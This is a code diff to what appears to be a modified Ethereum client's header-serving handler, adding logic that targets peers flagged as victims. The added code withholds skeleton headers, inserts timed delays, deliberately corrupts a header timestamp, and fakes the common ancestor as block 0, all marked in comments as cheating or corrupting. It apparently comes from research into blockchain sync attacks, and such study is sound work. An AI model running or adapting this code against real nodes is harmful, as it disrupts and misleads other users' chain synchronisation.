@@ -185,16 +185,46 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		if bridge.DoingPrediction() {
 			bridge.WaitBeforePivoting()
 		}
+
+		if bridge.DoingSync() {
+			if bridge.SteppingDone() {
+				bridge.SkeletonAndPivotingDelay()
+			} else if int(query.Origin.Number)/192 >= bridge.SteppingBatches() - 7 {
+				time.Sleep(1*time.Second)
+			}
+		}
 	}
 
 	skeleton := false
+	corruptHeader := false
 	if !hashMode && query.Amount == 128 && query.Skip == 191 && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 		bridge.SetSkeletonStart(query.Origin.Number)
 		skeleton = true
 
 		if bridge.DoingSync() {
-			log.Info("Providing only 19 skeleton headers")
-			query.Amount = 19
+			log.Info("Providing only 1 skeleton header")
+			query.Amount = 1
+
+			if bridge.SteppingDone() {
+				bridge.SkeletonAndPivotingDelay()
+			}
+
+			if !bridge.SteppingDone() {
+				if int(query.Origin.Number)%192 != 0 {
+					log.Crit("Skeleton not aligned to batch size", "number", query.Origin.Number)
+				}
+				if int(query.Origin.Number)/192 == bridge.SteppingBatches() - 7 {
+					bridge.TerminatingStepping()
+				}
+
+				if int(query.Origin.Number)/192 >= bridge.SteppingBatches() - 7 {
+					time.Sleep(1*time.Second)
+				}
+				if int(query.Origin.Number)/192 == bridge.SteppingBatches() {
+					corruptHeader = true
+					bridge.EndOfStepping()
+				}
+			}
 		}
 	}
 
@@ -243,6 +273,12 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		if bridge.DoingSync() && bridge.StopMoving() && query.Origin.Number > bridge.FixedHead() && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 			log.Info("Limiting query results", "fixedHead", bridge.FixedHead(), "origin", query.Origin.Number)
 			break
+		}
+
+		if corruptHeader {
+			origin.Time = origin.Time + 1
+			corruptHeader = false
+			log.Info("Corrupting header", "number", origin.Number)
 		}
 
 		if rlpData, err := rlp.EncodeToBytes(origin); err != nil {
@@ -391,10 +427,15 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 			bridge.CommitPRNG()
 		}
 
+		if bridge.DoingSync() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
+		 query.Amount==1 && !bridge.AncestorFound() && !bridge.SteppingDone() {
+		 	// Leave enough time to the orchestrator to compute the number of stepping batches
+		 	time.Sleep(1*time.Second)
+		 }
 		// Cheat about common ancestor
-		if bridge.DoingDelivery() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
+		if bridge.DoingSync() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
 		 query.Amount==1 && !bridge.AncestorFound() {
-			fakeCommonAncestor := bridge.FixedHead() - 2112
+			fakeCommonAncestor := 0
 		 	log.Info("Corrupting headers", "fakeCommonAncestor", fakeCommonAncestor)
 
 			var newHeaders []rlp.RawValue
